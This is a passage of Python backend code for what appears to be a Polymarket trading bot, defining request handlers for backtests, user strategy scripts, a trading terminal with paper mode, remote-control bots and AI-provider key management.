async def _h_perps_cancel_all(_p: dict) -> dict:
    c = perps_api.creds()
    if not c:
        return {"ok": False, "message": "Perps account not linked."}
    n = await perps_maker.cancel_ours(c)
    return {"ok": True, "message": f"Cancelled {n} quote(s)."}


async def _h_c15_history(p: dict) -> dict:
    limit = min(1000, max(1, int((p or {}).get("limit") or 200)))
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        rows = db.recent_crypto15m_resolved(conn, env, limit=limit)
    return {"rows": [crypto15m_trader._pos_to_js(r) for r in rows]}


async def _h_c15_backtest(p: dict) -> dict:
    import replay
    cfg = dict(STATE.cfg or {})
    patch = (p or {}).get("config") or {}
    if isinstance(patch, dict):
        cfg.update(patch)
    cfg = merge_with_defaults(cfg)
    since = int((p or {}).get("sinceDays") or 60)
    env = str((p or {}).get("env") or polymarket_auth.get_env())
    return await asyncio.to_thread(replay.replay, cfg, env=env, since_days=since)


async def _h_c15_parlay_generate(p: dict) -> dict:
    import parlay_generator
    p = p or {}
    sched = await asyncio.to_thread(
        lambda: parlay_generator.generate(
            env=str(p.get("env") or polymarket_auth.get_env()),
            interval=str(p.get("interval") or "15m"),
            since_days=int(p.get("sinceDays") or 60),
            holdout_days=int(p.get("holdoutDays") or parlay_generator.DEFAULT_HOLDOUT_DAYS),
            min_win_rate=float(p.get("minWinRate") or parlay_generator.DEFAULT_MIN_WIN_RATE),
            min_trades=int(p.get("minTrades") or parlay_generator.DEFAULT_MIN_TRADES),
        )
    )
    saved = p.get("save", True)
    if saved:
        parlay_generator.save_schedule(sched)
    return {"schedule": sched, "saved": bool(saved)}


async def _h_c15_parlay_status(_p: dict) -> dict:
    armed, sched = crypto15m_trader.parlay_state(force=True)
    return {"armed": armed, "schedule": sched}


async def _h_c15_parlay_arm(p: dict) -> dict:
    import parlay_generator
    try:
        parlay_generator.set_armed(bool((p or {}).get("armed")))
    except ValueError as e:
        armed, sched = crypto15m_trader.parlay_state(force=True)
        return {"armed": armed, "hasSchedule": bool(sched), "error": str(e)}
    armed, sched = crypto15m_trader.parlay_state(force=True)
    return {"armed": armed, "hasSchedule": bool(sched)}


async def _h_main_backtest(p: dict) -> dict:
    import replay
    cfg = dict(STATE.cfg or {})
    patch = (p or {}).get("config") or {}
    if isinstance(patch, dict):
        cfg.update(patch)
    cfg = merge_with_defaults(cfg)
    since = int((p or {}).get("sinceDays") or 60)
    return await asyncio.to_thread(replay.replay_main, cfg, since_days=since)


async def _h_collection_stats(_p: dict) -> dict:
    env = polymarket_auth.get_env()

    def _q() -> dict:
        with db.get_db() as conn:
            c15 = conn.execute(
                """SELECT COUNT(*) n, SUM(resolved) r, MIN(observed_at) a,
                          MAX(observed_at) b
                   FROM crypto15m_signals WHERE network=?""", (env,)
            ).fetchone()
            ticks = conn.execute(
                "SELECT COUNT(*) FROM crypto15m_ticks WHERE network=?", (env,)
            ).fetchone()[0]
            recent_c15 = conn.execute(
                """SELECT ticker, asset, favorite, favorite_price, up_won,
                          resolved, close_time
                   FROM crypto15m_signals WHERE network=?
                   ORDER BY id DESC LIMIT 12""", (env,)
            ).fetchall()
            wh = conn.execute(
                """SELECT COUNT(*) n, SUM(resolved) r, MIN(created_at) a,
                          MAX(created_at) b FROM whale_trades"""
            ).fetchone()
            al = conn.execute(
                """SELECT COUNT(*) n, SUM(resolved) r, MIN(created_at) a,
                          MAX(created_at) b FROM alerts"""
            ).fetchone()
            cats = conn.execute(
                """SELECT category, COUNT(*) n FROM whale_trades
                   GROUP BY category ORDER BY n DESC LIMIT 6"""
            ).fetchall()
            recent_main = conn.execute(
                """SELECT ticker, category, taker_side, price, dollar_value,
                          outcome_correct, resolved, created_at
                   FROM whale_trades ORDER BY id DESC LIMIT 12"""
            ).fetchall()
        return {
            "c15": {
                "windows": int(c15["n"] or 0),
                "resolved": int(c15["r"] or 0),
                "ticks": int(ticks or 0),
                "firstAt": c15["a"], "lastAt": c15["b"],
                "recent": [dict(r) for r in recent_c15],
            },
            "main": {
                "whales": int(wh["n"] or 0), "whalesResolved": int(wh["r"] or 0),
                "alerts": int(al["n"] or 0), "alertsResolved": int(al["r"] or 0),
                "firstAt": wh["a"] or al["a"], "lastAt": wh["b"] or al["b"],
                "topCategories": [dict(r) for r in cats],
                "recent": [dict(r) for r in recent_main],
            },
            "collecting": {
                "c15": bool((STATE.cfg or {}).get("crypto15m_record_signals", True)),
                "main": True,
            },
        }
    return await asyncio.to_thread(_q)


async def _h_export_research(_p: dict) -> dict:
    import csv

    def _dump() -> dict:
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        out_dir = os.path.join(os.path.dirname(str(db.db_path())), "exports", stamp)
        os.makedirs(out_dir, exist_ok=True)
        tables = ["crypto15m_signals", "crypto15m_ticks", "crypto15m_positions",
                  "whale_trades", "alerts"]
        files = []
        with db.get_db() as conn:
            for t in tables:
                rows = conn.execute(f"SELECT * FROM {t}").fetchall()
                path = os.path.join(out_dir, f"{t}.csv")
                with open(path, "w", newline="", encoding="utf-8") as f:
                    if rows:
                        w = csv.DictWriter(f, fieldnames=list(dict(rows[0]).keys()))
                        w.writeheader()
                        for r in rows:
                            w.writerow(dict(r))
                    else:
                        f.write("")
                files.append(path)
        return {"dir": out_dir, "files": files}
    return await asyncio.to_thread(_dump)


async def _h_trading_status(_p: dict) -> dict:
    cfg = STATE.cfg
    env = trader.get_env()
    main: list[dict] = []

    def gate(gid: str, label: str, ok: bool, reason: str = "", off: bool = False) -> None:
        main.append({
            "id": gid, "label": label,
            "state": "off" if off else ("ok" if ok else "blocked"),
            "reason": reason if not ok else "",
        })

    gate("paused", "Engine not paused", not STATE.paused, "paused by user")
    gate("auth", "Polymarket wallet", bool(STATE.auth_ok), "auth failed — check wallet credentials")
    enabled = bool(cfg.get("enable_trading"))
    gate("master", "Trading enabled", enabled, "master switch is OFF", off=not enabled)
    try:
        blocked, why = trader._is_blocked_by_daily_risk(cfg, env)
        gate("dailyRisk", "Daily stop/take-profit", not blocked, why or "")
    except Exception:
        gate("dailyRisk", "Daily stop/take-profit", True)
    try:
        hblocked, hwhy = trader._is_blocked_by_trading_hours(cfg)
        gate("hours", "Trading hours", not hblocked, hwhy or "")
    except Exception:
        gate("hours", "Trading hours", True)
    try:
        lok, lwhy = trader.can_open_new_entries(env)
        gate("walletLock", "Wallet not traded elsewhere", lok, lwhy or "")
    except Exception:
        gate("walletLock", "Wallet not traded elsewhere", True)
    lc = dict(getattr(trader, "last_cycle", {}) or {})
    if lc.get("skipReason"):
        gate("cycle", "Last scan cycle", False, str(lc.get("skipReason")))
    else:
        gate("cycle", "Last scan cycle", True)

    c15 = await crypto15m_trader.status(cfg, authed=STATE.auth_ok)
    return {
        "main": main,
        "loopBlocksMs": dict(_loop_block_ms),
        "mainFilterCounts": lc.get("filterCounts") or {},
        "mainCandidates": lc.get("candidates") or 0,
        "mainPlaced": lc.get("placed") or 0,
        "c15": {
            "enabled": c15.get("enabled"),
            "live": c15.get("trading"),
            "authed": bool(STATE.auth_ok),
            "env": env,
            "blockReasons": c15.get("blockReasons") or {},
        },
    }


async def _h_copyStatus(_p: dict) -> dict:
    return await copy_trader.status(STATE.cfg, authed=STATE.auth_ok)


def _sanitize_script_code(raw: Any) -> str:
    return str(raw or "").encode("utf-8", "replace").decode("utf-8", "replace")


def _script_status_js(r: dict) -> dict:
    import script_engine
    sid = str(r.get("id") or "")
    st = script_engine.status_for(sid)
    cfg = STATE.cfg or {}
    enabled = bool(r.get("enabled"))
    shadow = bool(r.get("dry_run", 1))

    if not enabled:
        state, detail = "off", "Not enabled — flip Enabled to start it."
    elif not STATE.auth_ok:
        state, detail = ("blocked",
                         "No wallet connected — connect one on the Dashboard.")
    elif not shadow and not cfg.get("scripts_live_enabled"):
        state, detail = ("blocked",
                         'Armed for real orders, but the "Scripts live" master '
                         "switch is off — it is not running. Turn the master "
                         "switch on, or set this script back to Shadow.")
    elif st.get("gate") == "over_cap":
        state, detail = ("blocked",
                         f"Past the {int(cfg.get('script_max_enabled') or 10)}-script "
                         "concurrency cap — disable another script or raise the cap.")
    elif st.get("gate") == "compile_failed":
        state, detail = "error", "Its code failed to load — see the error above."
    elif not st.get("ticks"):
        state, detail = ("starting",
                         "Enabled and waiting for its first tick (~5s).")
    else:
        ticks = int(st.get("ticks") or 0)
        orders = int(st.get("orders") or 0)
        noun = "shadow order" if shadow else "order"
        detail = (f"Running in {'shadow' if shadow else 'LIVE'} — {ticks:,} tick(s), "
                  f"{orders:,} {noun}{'' if orders == 1 else 's'}")
        if st.get("lastIntentAt"):
            detail += f", last signal {_iso_utc(st['lastIntentAt'])}"
        else:
            detail += ", no setup found yet (a selective strategy can go days)"
        state = "running"
    return {
        "state": state, "detail": detail,
        "ticks": int(st.get("ticks") or 0),
        "intents": int(st.get("intents") or 0),
        "orders": int(st.get("orders") or 0),
        "lastTickAt": st.get("lastTickAt"),
        "lastIntentAt": st.get("lastIntentAt"),
        "lastOrderAt": st.get("lastOrderAt"),
    }


def _script_row_js(r: dict, stats: dict | None = None,
                   shadow_stats: dict | None = None) -> dict:
    import script_audit
    import script_backtest
    code = _sanitize_script_code(r.get("code"))
    return {
        "id": r.get("id"), "name": r.get("name"),
        "description": r.get("description") or "",
        "code": code,
        "enabled": bool(r.get("enabled")),
        "assets": script_backtest.parse_asset_scope(r.get("assets")),
        "audit": script_audit.audit(code),
        "status": _script_status_js(r),
        "dryRun": bool(r.get("dry_run", 1)),
        "shadowStats": (shadow_stats or {}).get(str(r.get("id"))) or None,
        "notes": r.get("notes") or "",
        "lastError": r.get("last_error"),
        "lastErrorAt": _iso_utc(r.get("last_error_at")),
        "createdAt": _iso_utc(r.get("created_at")),
        "updatedAt": _iso_utc(r.get("updated_at")),
        "stats": (stats or {}).get(str(r.get("id"))) or None,
    }


async def _h_scripts_list(_p: dict) -> dict:
    env = polymarket_auth.get_env()
    with db.get_db() as conn:
        rows = db.list_user_scripts(conn)
        stats = db.script_live_stats(conn, env)
        shadow = db.script_shadow_stats(conn, env)
    return {"scripts": [_script_row_js(r, stats, shadow) for r in rows]}


async def _h_script_set_dry_run(p: dict) -> dict:
    sid = str(p.get("id") or "")
    dry = bool(p.get("dryRun"))
    with db.get_db() as conn:
        row = db.get_user_script(conn, sid)
        if not row:
            raise ValueError("script not found")
        if not dry:
            errors = script_sandbox.validate(str(row.get("code") or ""))
            if errors:
                raise ValueError("script does not validate: " + errors[0])
        db.update_user_script(conn, sid, dry_run=1 if dry else 0)
        row = db.get_user_script(conn, sid)
        stats = db.script_live_stats(conn, polymarket_auth.get_env())
        shadow = db.script_shadow_stats(conn, polymarket_auth.get_env())
    logger.warning(
        f"[scripts] {row.get('name')} ({sid[:8]}) is now "
        f"{'SHADOW (no real orders)' if dry else 'ARMED FOR REAL ORDERS'}")
    return {"script": _script_row_js(row or {}, stats, shadow)}


async def _h_script_shadow_orders(p: dict) -> dict:
    with db.get_db() as conn:
        rows = db.list_script_shadow(conn, str(p.get("id") or ""),
                                     int(p.get("limit") or 200))
    return {"orders": [{
        "id": r.get("id"), "source": r.get("source"),
        "asset": r.get("asset"), "ticker": r.get("ticker"),
        "side": r.get("side"), "contracts": r.get("contracts"),
        "entryCents": r.get("entry_cents"), "orderType": r.get("order_type"),
        "reason": r.get("reason") or "", "refused": bool(r.get("refused")),
        "note": r.get("note") or "",
        "resolved": bool(r.get("resolved")),
        "won": (None if r.get("outcome_correct") is None
                else bool(r.get("outcome_correct"))),
        "pnlUsd": r.get("pnl_usd"),
        "at": _iso_utc(r.get("created_at")),
    } for r in rows]}


async def _h_script_save(p: dict) -> dict:
    sid = str(p.get("id") or "").strip() or os.urandom(8).hex()
    code = _sanitize_script_code(p.get("code"))
    meta = script_sandbox.parse_header(code)
    name = str(p.get("name") or "").strip() or meta.get("name") or "Untitled script"
    desc = str(p.get("description") or "").strip() or meta.get("description") or ""
    import script_audit
    with db.get_db() as conn:
        existing = db.get_user_script(conn, sid)
        errors = script_sandbox.validate(code)
        audit = script_audit.audit(code)
        code_changed = bool(existing) and str(existing.get("code") or "") != code
        force_off = (code_changed and bool(existing.get("enabled"))
                     and not audit["ok"])
        db.upsert_user_script(conn, {
            "id": sid, "name": name, "description": desc, "code": code,
            "notes": str(p.get("notes") or ""),
        })
        if errors:
            db.update_user_script(conn, sid, enabled=0,
                                  last_error="; ".join(errors[:3])[:500])
        elif force_off:
            db.update_user_script(
                conn, sid, enabled=0,
                last_error=f"Code changed and the risk audit flagged "
                           f"{audit['critical']} critical issue(s) — disabled "
                           "pending your review. Read the Risk tab, then "
                           "re-enable.")
        else:
            db.update_user_script(conn, sid, last_error=None)
        row = db.get_user_script(conn, sid)
    return {"script": _script_row_js(row or {}), "errors": errors,
            "warnings": _script_warnings(code), "audit": audit,
            "disarmed": force_off}


def _script_warnings(code: str) -> list[str]:
    import replay
    missing = sorted(set(script_sandbox.find_ctx_fields(code)) - replay._DERIVABLE)
    warnings = []
    if missing:
        warnings.append(
            "Reads ctx fields that are LIVE-ONLY (None during backtests): "
            + ", ".join(missing))
    return warnings


async def _h_script_delete(p: dict) -> dict:
    sid = str(p.get("id") or "")
    with db.get_db() as conn:
        db.delete_user_script(conn, sid)
    try:
        import script_engine
        script_engine.forget(sid)
    except Exception:
        pass
    return {"ok": True}


async def _h_script_set_enabled(p: dict) -> dict:
    sid = str(p.get("id") or "")
    enabled = bool(p.get("enabled"))
    with db.get_db() as conn:
        row = db.get_user_script(conn, sid)
        if not row:
            raise ValueError("script not found")
        if enabled:
            errors = script_sandbox.validate(str(row.get("code") or ""))
            if errors:
                raise ValueError("script does not validate: " + errors[0])
            db.update_user_script(conn, sid, enabled=1, last_error=None)
        else:
            db.update_user_script(conn, sid, enabled=0)
        row = db.get_user_script(conn, sid)
    return {"script": _script_row_js(row or {})}


async def _h_script_set_assets(p: dict) -> dict:
    import script_backtest
    sid = str(p.get("id") or "")
    scope = script_backtest.parse_asset_scope(p.get("assets"))
    with db.get_db() as conn:
        row = db.get_user_script(conn, sid)
        if not row:
            raise ValueError("script not found")
        db.update_user_script(
            conn, sid, assets=json.dumps(scope) if scope else None)
        row = db.get_user_script(conn, sid)
    return {"script": _script_row_js(row or {})}


async def _h_script_validate(p: dict) -> dict:
    import script_audit
    code = _sanitize_script_code(p.get("code"))
    errors = script_sandbox.validate(code)
    meta = script_sandbox.parse_header(code)
    return {
        "ok": not errors, "errors": errors,
        "warnings": _script_warnings(code),
        "audit": script_audit.audit(code),
        "name": meta.get("name") or "", "description": meta.get("description") or "",
        "hasHeader": bool(meta.get("version")),
        "ctxFields": script_sandbox.find_ctx_fields(code),
    }


async def _h_script_backtest(p: dict) -> dict:
    import script_backtest
    cfg = dict(STATE.cfg or {})
    patch = (p or {}).get("config") or {}
    if isinstance(patch, dict):
        cfg.update(patch)
    cfg = merge_with_defaults(cfg)
    since = int((p or {}).get("sinceDays") or 60)
    env = str((p or {}).get("env") or polymarket_auth.get_env())
    code = _sanitize_script_code(p.get("code"))
    assets = (p or {}).get("assets")
    if not code:
        with db.get_db() as conn:
            row = db.get_user_script(conn, str(p.get("id") or ""))
        if not row:
            raise ValueError("script not found")
        code = _sanitize_script_code(row.get("code"))
        if assets is None:
            assets = row.get("assets")
    return await asyncio.to_thread(
        script_backtest.run, cfg, str(code),
        assets=assets, env=env, since_days=since,
    )


async def _h_script_context_pack(_p: dict) -> dict:
    import script_docs
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    env = polymarket_auth.get_env()
    text = await asyncio.to_thread(script_docs.build_context_pack, cfg, env)
    return {"text": text}


async def _h_script_api_docs(_p: dict) -> dict:
    import replay
    import script_docs
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    return {
        "contract": script_docs.CONTRACT_DOC,
        "fields": [
            {"name": n, "doc": d, "backtestable": n in replay._DERIVABLE}
            for n, d in script_docs.FIELD_DOCS.items()
        ],
        "injected": list(script_sandbox.INJECTED_GLOBALS),
        "hookTimeoutSec": float(cfg.get("script_hook_timeout_sec") or 1.0),
        "rails": {
            "maxEntryCents": int(cfg.get("script_max_entry_cents") or 97),
            "maxContracts": int(cfg.get("script_max_contracts") or 20),
            "maxOpen": int(cfg.get("script_max_open") or 2),
            "dailyLossUsd": float(cfg.get("script_daily_loss_usd") or 25.0),
            "defaultOrderSize": int(cfg.get("crypto15m_order_size") or 1),
        },
        "examples": [
            {"name": "Late Favorite Follow", "code": script_docs.EXAMPLE_SIMPLE},
            {"name": "Momentum Confirm (stateful)", "code": script_docs.EXAMPLE_STATEFUL},
            {"name": "Trailing Exit (manage hook)", "code": script_docs.EXAMPLE_MANAGE},
            {"name": "Night Shift (supervisor)", "code": script_docs.EXAMPLE_SUPERVISOR},
        ],
        "presets": script_docs.PRESETS,
    }


async def _h_polymarketUrl(p: dict) -> dict:
    url = await polymarket_api.web_market_url(
        event_ticker=str(p.get("eventTicker") or ""),
        ticker=str(p.get("ticker") or ""),
        env=str(p.get("env") or "mainnet"),
    )
    return {"url": url}


async def _h_terminal_discover(p: dict) -> dict:
    import terminal
    return await terminal.discover(
        str(p.get("column") or "volume"),
        int(p.get("limit") or 40),
        p.get("filters") or None,
    )


async def _h_terminal_search(p: dict) -> dict:
    import terminal
    return await terminal.search(str(p.get("query") or ""), int(p.get("limit") or 30))


async def _h_terminal_market(p: dict) -> dict:
    import terminal
    m = await terminal.market(str(p.get("conditionId") or ""))
    return {"market": m}


async def _h_terminal_book(p: dict) -> dict:
    import terminal
    return await terminal.book(
        str(p.get("conditionId") or ""), str(p.get("side") or "yes"))


async def _h_terminal_history(p: dict) -> dict:
    import terminal
    return await terminal.price_history(
        str(p.get("conditionId") or ""),
        str(p.get("side") or "yes"),
        str(p.get("interval") or "1d"),
    )


async def _h_terminal_tape(p: dict) -> dict:
    import terminal
    return await terminal.tape(
        str(p.get("conditionId") or ""), int(p.get("limit") or 40))


async def _h_terminal_resolution(p: dict) -> dict:
    import terminal
    return await terminal.resolution_report(str(p.get("conditionId") or ""))


async def _h_terminal_related(p: dict) -> dict:
    import terminal
    return await terminal.related(
        str(p.get("conditionId") or ""), int(p.get("limit") or 25))


async def _h_terminal_cross_venue(p: dict) -> dict:
    import cross_venue
    return await cross_venue.compare(
        str(p.get("conditionId") or ""), str(p.get("interval") or "1d"))


async def _h_terminal_micro(p: dict) -> dict:
    import terminal
    return terminal.micro_series(
        str(p.get("conditionId") or ""), str(p.get("side") or "yes"))


async def _h_terminal_health(_p: dict) -> dict:
    import terminal
    return terminal.health()


async def _h_terminal_watchlist(p: dict) -> dict:
    import terminal
    action = str(p.get("action") or "list")
    cid = str(p.get("conditionId") or "")
    if action == "add":
        entries = terminal.watchlist_add(cid, p.get("title"), p.get("note"))
    elif action == "remove":
        entries = terminal.watchlist_remove(cid)
    else:
        entries = terminal.watchlist_list()
    return {"entries": entries}


async def _h_terminal_preview(p: dict) -> dict:
    import terminal_trade
    return await terminal_trade.preview(p.get("order") or {})


async def _h_terminal_place(p: dict) -> dict:
    import terminal_trade
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    if cfg.get("terminal_paper_mode"):
        return {
            "ok": False, "orderId": None, "status": None, "filledSize": None,
            "avgPriceCents": None, "localId": None,
            "message": (
                "Paper mode is on, so no real order was sent. Turn it off in "
                "Settings if you meant to trade live."),
        }
    if not STATE.auth_ok:
        return {
            "ok": False, "orderId": None, "status": None, "filledSize": None,
            "avgPriceCents": None, "localId": None,
            "message": "Your wallet is not connected, so no order can be signed.",
        }
    res = await terminal_trade.place(p.get("order") or {})
    if res.get("ok"):
        logger.info(
            "terminal: manual order %s", res.get("message") or res.get("orderId"))
    return res


async def _h_terminal_flatten_wallet(p: dict) -> dict:
    import terminal_trade
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    if (p or {}).get("preview"):
        return await terminal_trade.flatten_preview()

    refuse = {"ok": False, "attempted": 0, "sold": 0, "refused": 0,
              "skipped": 0, "proceedsUsd": None, "engineTrackedSold": None,
              "reason": "flatten", "results": []}
    if cfg.get("terminal_paper_mode"):
        return {**refuse, "message": (
            "Paper mode is on, so nothing was sold. Turn it off in Settings "
            "if you meant to flatten for real.")}
    if not STATE.auth_ok:
        return {**refuse, "message": (
            "Your wallet is not connected, so no sell can be signed.")}
    res = await terminal_trade.flatten_wallet(
        allow_trading=True, origin="manual", reason=str(
            (p or {}).get("reason") or "flatten"))
    logger.info("terminal: flatten wallet — %s", res.get("message"))
    try:
        await emit_event("backend:reconciled", {"flattened": res.get("sold")})
    except Exception:
        pass
    return res


async def _h_terminal_sell_preview(p: dict) -> dict:
    import terminal_trade
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    req = dict(p.get("order") or {})
    req["paper"] = bool(cfg.get("terminal_paper_mode"))
    return await terminal_trade.sell_position_preview(req)


async def _h_terminal_sell_position(p: dict) -> dict:
    import terminal_trade
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    paper = bool(cfg.get("terminal_paper_mode"))
    req = dict(p.get("order") or {})
    req["paper"] = paper
    if not paper and not STATE.auth_ok:
        return {
            "ok": False, "orderId": None, "status": None, "localId": None,
            "sentSize": None, "limitCents": None, "filledSize": None,
            "avgPriceCents": None, "proceedsUsd": None, "killedSize": None,
            "estimatedProceedsUsd": None, "preview": None,
            "message": "Your wallet is not connected, so no sell can be signed.",
        }
    res = await terminal_trade.sell_position(req)
    if res.get("ok"):
        logger.info("terminal: position sell — %s", res.get("message"))
    return res


async def _h_terminal_paper_place(p: dict) -> dict:
    import terminal_paper
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    return await terminal_paper.place(p.get("order") or {}, cfg)


async def _h_terminal_paper_portfolio(_p: dict) -> dict:
    import terminal_paper
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    return await terminal_paper.portfolio(cfg)


async def _h_terminal_paper_orders(p: dict) -> dict:
    import terminal_paper
    return terminal_paper.orders(int(p.get("limit") or 100))


async def _h_terminal_paper_cancel(p: dict) -> dict:
    import terminal_paper
    return await terminal_paper.cancel(int(p.get("localId") or 0))


async def _h_terminal_paper_reset(_p: dict) -> dict:
    import terminal_paper
    return terminal_paper.reset()


async def _h_terminal_cancel(p: dict) -> dict:
    import terminal_trade
    return await terminal_trade.cancel(str(p.get("orderId") or ""))


async def _h_terminal_orders(p: dict) -> dict:
    import terminal_trade
    cid = str((p or {}).get("conditionId") or "").strip() or None
    return await terminal_trade.resting_orders(cid)


async def _h_terminal_portfolio(_p: dict) -> dict:
    import terminal_trade
    return await terminal_trade.portfolio()


async def _h_terminal_settled(_p: dict) -> dict:
    import terminal_trade
    return await terminal_trade.settled_record()


async def _h_terminal_fills(p: dict) -> dict:
    import terminal_trade
    return terminal_trade.fills(int(p.get("limit") or 100))


async def _h_terminal_order_log(p: dict) -> dict:
    import terminal_trade
    return terminal_trade.order_log(int(p.get("limit") or 100))


async def _h_terminal_reconcile(_p: dict) -> dict:
    import terminal_trade
    return await terminal_trade.reconcile_fills()


async def _h_terminal_standing(p: dict) -> dict:
    import terminal_trade
    action = str(p.get("action") or "list")
    if action == "add":
        try:
            terminal_trade.standing_add(p.get("item") or {})
        except terminal_trade.TerminalTradeError as e:
            return {"instructions": terminal_trade.standing_list(), "error": str(e)}
    elif action == "cancel":
        terminal_trade.standing_cancel(str(p.get("id") or ""))
    elif action == "arm":
        terminal_trade.standing_set_armed(
            str(p.get("id") or ""), bool(p.get("armed")))
    return {"instructions": terminal_trade.standing_list(), "error": None}


async def _remote_sync() -> dict:
    import bot_discord
    import bot_telegram
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    on = bool(cfg.get("remote_enabled"))
    want_d = on and bool(cfg.get("remote_discord_enabled"))
    want_t = on and bool(cfg.get("remote_telegram_enabled"))
    if want_d and not bot_discord.is_running():
        await bot_discord.start()
    elif not want_d:
        await bot_discord.stop()
    if want_t and not bot_telegram.is_running():
        await bot_telegram.start()
    elif not want_t and bot_telegram.is_running():
        await bot_telegram.stop()
    import remote
    return remote.status()


async def _h_remote_status(_p: dict) -> dict:
    import remote
    st = remote.status()
    import bot_secrets
    st["discord"]["tokenMasked"] = bot_secrets.masked("discord")
    st["telegram"]["tokenMasked"] = bot_secrets.masked("telegram")
    return st


async def _h_remote_set_token(p: dict) -> dict:
    import bot_discord
    import bot_secrets
    import bot_telegram
    platform = str(p.get("platform") or "")
    token = str(p.get("token") or "").strip()
    if platform not in ("discord", "telegram"):
        return {"ok": False, "message": f"Unknown platform {platform!r}."}
    if not token:
        bot_secrets.clear_token(platform)
        await _remote_sync()
        return {"ok": True, "message": "Token cleared."}
    mod = bot_discord if platform == "discord" else bot_telegram
    res = await mod.verify_token(token)
    if not res.get("ok"):
        return {"ok": False, "message": res.get("message") or "Rejected."}
    bot_secrets.save_token(platform, token)
    await _remote_sync()
    return {"ok": True, "message": res.get("message") or "Saved.",
            "username": res.get("username")}


async def _h_remote_pair_code(p: dict) -> dict:
    import remote
    return remote.new_pair_code(str(p.get("platform") or "telegram"))


async def _h_remote_unpair(p: dict) -> dict:
    import remote
    rows = remote.remove_paired(
        str(p.get("platform") or ""), str(p.get("id") or ""))
    return {"paired": rows}


async def _h_remote_add_paired(p: dict) -> dict:
    import remote
    try:
        rows = remote.add_paired(
            str(p.get("platform") or ""), str(p.get("id") or ""),
            str(p.get("label") or ""))
    except ValueError as e:
        return {"paired": remote.paired(str(p.get("platform") or "")),
                "error": str(e)}
    return {"paired": rows, "error": None}


async def _h_remote_sync(_p: dict) -> dict:
    return await _remote_sync()


async def _mcp_sync() -> dict:
    import mcp_server
    return await mcp_server.sync(merge_with_defaults(dict(STATE.cfg or {})))


async def _h_mcp_status(_p: dict) -> dict:
    import mcp_server
    return mcp_server.status(merge_with_defaults(dict(STATE.cfg or {})))


async def _h_mcp_sync(_p: dict) -> dict:
    return await _mcp_sync()


async def _h_mcp_rotate_token(_p: dict) -> dict:
    import mcp_server
    mcp_server.rotate_token()
    return mcp_server.status(merge_with_defaults(dict(STATE.cfg or {})))


async def _h_mcp_reveal_token(_p: dict) -> dict:
    import mcp_server
    return {"token": mcp_server.ensure_token()}


async def _h_mcp_paper(p: dict) -> dict:
    import terminal_paper
    cfg = merge_with_defaults(dict(STATE.cfg or {}))
    with terminal_paper.using_book("ai"):
        if (p or {}).get("reset"):
            terminal_paper.reset()
        return {"portfolio": await terminal_paper.portfolio(cfg),
                "orders": terminal_paper.orders(int((p or {}).get("limit") or 50))}


async def _h_remote_test(_p: dict) -> dict:
    import remote
    n = await remote.push(
        "Test from Krypt PolyBot. If you can read this, remote control is "
        "working. Send /help for commands.")
    return {"sent": n,
            "message": (f"Sent to {n} paired account(s)." if n else
                        "Nothing sent — no paired accounts, or no bot is "
                        "connected.")}


async def _h_ai_status(_p: dict) -> dict:
    import ai_analysis
    return ai_analysis.status(STATE.cfg or {})


async def _h_ai_analyze(p: dict) -> dict:
    import ai_analysis
    import terminal
    cfg = STATE.cfg or {}
    if not ai_analysis.is_enabled(cfg):
        return await ai_analysis.analyze({}, cfg)
    cid = str(p.get("conditionId") or "").strip()
    m = await terminal.market(cid, include_raw=True) if cid else None
    if not m:
        return ai_analysis._fail(
            str(cfg.get("ai_provider") or "anthropic"), "", terminal._now_iso(),
            "That market could not be read, so there was nothing to analyse.",
            None)
    return await ai_analysis.analyze(m, cfg)


async def _h_ai_set_key(p: dict) -> dict:
    import ai_analysis
    import ai_secrets
    provider = str(p.get("provider") or "")
    key = str(p.get("key") or "").strip()
    if provider not in ai_analysis.PROVIDERS:
        return {"ok": False, "message": f"Unknown provider {provider!r}."}
    if not key:
        ai_secrets.clear_key(provider)
        return {"ok": True, "message": "Key cleared.", "models": []}

    previous = ai_secrets.load_key(provider)
    ai_secrets.save_key(provider, key)
    try:
        models = await ai_analysis.list_models(provider)
    except Exception as e:
        if previous:
            ai_secrets.save_key(provider, previous)
        else:
            ai_secrets.clear_key(provider)
        reason = getattr(e, "reason", None) or f"{type(e).__name__}: {e}"
        return {"ok": False, "message": f"{provider} rejected that key — {reason}"}
    return {
        "ok": True,
        "message": f"Key verified. {len(models)} models available.",
        "models": models,
        "masked": ai_secrets.masked(provider),
    }


async def _h_ai_list_models(p: dict) -> dict:
    import ai_analysis
    provider = str(p.get("provider") or "")
    if provider not in ai_analysis.PROVIDERS:
        return {"ok": False, "message": f"Unknown provider {provider!r}.", "models": []}
    try:
        return {"ok": True, "models": await ai_analysis.list_models(provider)}
    except Exception as e:
        reason = getattr(e, "reason", None) or f"{type(e).__name__}: {e}"
        return {"ok": False, "message": reason, "models": []}


_HANDLERS = {
    "ping": _h_ping,
    "aiStatus": _h_ai_status,
    "aiAnalyze": _h_ai_analyze,
    "aiSetKey": _h_ai_set_key,
    "aiListModels": _h_ai_list_models,
    "crypto15m": _h_crypto15m,
    "crypto15mStatus": _h_crypto15mStatus,
    "perpsBoard": _h_perps_board,
    "perpsStatus": _h_perps_status,
    "perpsLink": _h_perps_link,
    "perpsUnlink": _h_perps_unlink,
    "perpsFlatten": _h_perps_flatten,
    "perpsBacktest": _h_perps_backtest,
    "dataUserPnl": _h_data_user_pnl,
    "dataResolutions": _h_data_resolutions,
    "dataHolders": _h_data_holders,
    "dataBiggestWinners": _h_data_biggest_winners,
    "perpsCancelAll": _h_perps_cancel_all,
    "tradingStatus": _h_trading_status,
    "c15History": _h_c15_history,
    "c15Backtest": _h_c15_backtest,
    "c15ParlayGenerate": _h_c15_parlay_generate,
    "c15ParlayStatus": _h_c15_parlay_status,
    "c15ParlayArm": _h_c15_parlay_arm,
    "mainBacktest": _h_main_backtest,
    "collectionStats": _h_collection_stats,
    "exportResearch": _h_export_research,
    "scriptsList": _h_scripts_list,
    "scriptSave": _h_script_save,
    "scriptDelete": _h_script_delete,
